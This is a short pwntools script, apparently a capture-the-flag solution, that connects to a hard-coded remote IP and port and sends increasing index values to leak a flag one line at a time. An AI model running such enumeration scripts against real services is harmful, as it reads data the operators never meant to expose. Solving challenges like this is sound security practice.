import pwn

p = pwn.remote("94.237.59.199", "51012")

flag = ""
i = -1
while True:
    i+=1 
    p.sendlineafter("index: ", str(i))
    p.recvuntil(": ")
    flag += p.recvline().strip().decode()

    print(flag)
